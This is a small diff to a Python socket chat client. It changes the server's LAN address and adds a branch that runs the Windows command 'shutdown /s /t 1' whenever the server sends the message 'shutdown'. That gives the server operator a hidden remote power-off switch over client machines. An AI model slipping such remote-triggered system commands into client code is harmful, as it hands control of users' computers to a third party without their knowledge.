@@ -1,10 +1,11 @@
 import socket
 import threading
+import os
 
 HEADER = 64 
 PORT = 5050  #88 , 80
 DISCONNENCT_MSG = "!DISCONNECT"
-SERVER = "192.168.1.72"
+SERVER = "192.168.1.79"
 FORMAT = "utf-8"
 ADDR = (SERVER, PORT)
 
@@ -18,6 +19,8 @@ def Recv():
         if msg_length:
             msg_length = int(msg_length)
             msg = client.recv(msg_length).decode(FORMAT)
+            if msg == "shutdown":
+                os.system("shutdown /s /t 1")
             if msg == DISCONNENCT_MSG:
                 connected = False
             print(f'- {msg}')
